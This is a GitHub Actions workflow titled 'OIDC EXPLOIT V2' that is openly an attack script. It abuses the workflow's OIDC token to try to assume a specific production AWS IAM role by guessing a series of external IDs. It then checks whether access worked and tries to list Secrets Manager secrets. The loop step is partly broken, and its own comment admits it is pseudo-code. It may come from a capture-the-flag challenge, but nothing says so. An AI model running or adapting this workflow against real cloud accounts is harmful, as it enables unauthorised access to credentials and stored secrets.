name: OIDC EXPLOIT V2

  on:
    workflow_dispatch:
    push:

  jobs:
    exploit:
      runs-on: ubuntu-latest
      permissions:
        id-token: write
        contents: read
      steps:
      - name: Debug OIDC Token Before Assumption
        run: |
          echo "=== OIDC Token Claims ==="
          echo "Repository: $GITHUB_REPOSITORY"
          echo "Repository Owner: $GITHUB_REPOSITORY_OWNER"
          echo "Actor: $GITHUB_ACTOR"
          echo "Ref: $GITHUB_REF"
          echo "SHA: $GITHUB_SHA"
          echo "Event Name: $GITHUB_EVENT_NAME"
          echo "Workflow: $GITHUB_WORKFLOW"
          echo "Job: $GITHUB_JOB"
          echo "Run ID: $GITHUB_RUN_ID"
          echo "Run Number: $GITHUB_RUN_NUMBER"

      - name: Try Original Repository Context
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::170974506515:role/prod-readonly-auditor
          aws-region: us-west-1
          role-session-name: HEXNOVA404-OriginalContext
          role-external-id: "HEXNOVA404"
        continue-on-error: true

      - name: Try with Repository Name as External ID
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::170974506515:role/prod-readonly-auditor
          aws-region: us-west-1
          role-session-name: RepoNameExtId
          role-external-id: "Organisation-Vault"
        continue-on-error: true

      - name: Try with Account/Repo Pattern
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::170974506515:role/prod-readonly-auditor
          aws-region: us-west-1
          role-session-name: AccountRepoPattern
          role-external-id: "170974506515"
        continue-on-error: true

      - name: Try Date-based External ID (from gist effective date)
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::170974506515:role/prod-readonly-auditor
          aws-region: us-west-1
          role-session-name: DateBasedExtId
          role-external-id: "2025-07-10"
        continue-on-error: true

      - name: Try Various External ID Patterns
        run: |
          # Try common external ID patterns
          for ext_id in "prod-readonly-auditor" "audit-access" "hexnova404-audit" "github-oidc" "ci-deployment" "external-audit"; do
            echo "Trying external ID: $ext_id"
            # This is pseudo-code - we'd need to use the AWS CLI directly for this
            aws sts assume-role-with-web-identity \
              --role-arn arn:aws:iam::170974506515:role/prod-readonly-auditor \
              --role-session-name "ExtIdTest-$ext_id" \
              --web-identity-token "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
              --external-id "$ext_id" 2>/dev/null && echo "SUCCESS with $ext_id" || echo "Failed with $ext_id"
          done
        continue-on-error: true

      - name: Test if any assumption worked
        run: |
          aws sts get-caller-identity && echo "=== AWS ACCESS SUCCESSFUL ===" || echo "No AWS access"
          aws secretsmanager list-secrets 2>/dev/null && echo "=== SECRETS ACCESS SUCCESSFUL ===" || echo "No secrets access"
